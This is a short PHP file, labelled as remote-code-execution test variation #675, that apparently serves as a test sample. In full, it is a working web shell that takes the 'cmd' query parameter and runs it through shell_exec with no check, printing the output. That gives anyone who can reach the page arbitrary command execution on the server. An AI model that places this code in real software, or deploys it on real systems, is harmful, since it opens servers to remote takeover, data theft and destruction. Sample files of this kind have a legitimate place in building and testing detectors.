<?php
// RCE test variation #675
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>